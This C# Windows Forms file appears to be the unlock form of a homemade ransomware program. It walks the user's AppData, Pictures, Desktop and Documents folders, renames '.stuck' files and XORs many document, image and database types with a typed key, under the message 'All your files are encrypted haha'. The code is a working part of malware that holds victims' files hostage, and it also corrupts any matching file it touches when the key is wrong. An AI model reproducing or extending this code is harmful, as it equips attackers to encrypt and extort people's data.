using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace TengoQueDecirteAlgo
{
    public partial class Form2 : Form
    {
        string[] location = { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) };

        public Form2()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            unLock();
        }
        
        void desCrypt()
        {
            var validExtensions = new[] { ".stuck", ".txt", ".jpeg", ".mp4", ".doc", ".ods", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" };

            string key = textBox1.Text;
            byte[] bytesKey = Encoding.ASCII.GetBytes(key);

            foreach(string direct in location)
            {
                string[] files = Directory.GetFiles(direct);
                foreach(string file in files)
                {
                    string extension = Path.GetExtension(file);
                    try
                    {
                        
                        if (validExtensions.Contains(extension))
                        {
                            byte[] bytesFile = File.ReadAllBytes(file);
                            byte[] realBytes = enc(bytesFile, bytesKey);
                            File.WriteAllBytes(file, realBytes);
                        }
                    } catch { }
                        //}
                    
                }
            }

        }

        void unLock()
        {
            foreach (string direct in location)
            {
                string[] files = Directory.GetFiles(direct);
                foreach (string file in files)
                {
                    string extension = Path.GetExtension(file);
                    string realExtension = file.Substring(0, file.Length - extension.Length);
                    if (extension == ".stuck")
                    {
                        try
                        {
                            File.Move(file, realExtension);
                        }
                        catch { }
                    }
                }
            }
            desCrypt();
        }

        Byte[] enc(byte[] myFileBytes, byte[] key)
        {
            for(int i = 0; i < myFileBytes.Length; i++)
            {
                myFileBytes[i] ^= key[i % key.Length];
            }
            return myFileBytes;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            textBox1.Text = "All your files are encrypted haha";
        }
    }
}
